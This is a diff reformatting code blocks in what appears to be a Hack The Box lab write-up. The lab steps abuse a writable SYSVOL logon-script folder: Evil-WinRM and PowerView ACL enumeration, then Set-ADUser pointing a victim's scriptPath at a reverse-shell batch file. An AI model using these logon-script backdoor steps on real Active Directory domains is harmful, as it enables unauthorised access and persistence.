@@ -377,9 +377,6 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ...
 
 RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23
-
-...
-
 ```
 
 #### User rsa_4810 has write perm on logon script dir
@@ -388,9 +385,10 @@ RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23
 - https://www.thehacker.recipes/ad/movement/dacl/logon-script
 - https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/
 
-```*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23>. .\PowerView.ps1```
-
 ```
+*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23>. .\PowerView.ps1
+
+
 *Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RSA_4810"}
 
 ObjectDN                : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
@@ -411,7 +409,9 @@ IdentityReferenceClass  : user
 
 #### put a revshell on .bat file and move to logon script writable dir, later set scriptpath for this dir.
 
-```*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> set-aduser -identity ssa_6010 -scriptpath 'A32FF3AEAA23\rev.bat'```
+```
+*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> set-aduser -identity ssa_6010 -scriptpath 'A32FF3AEAA23\rev.bat'
+```
 
 ```
 *Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> get-aduser ssa_6010 -properties scriptpath
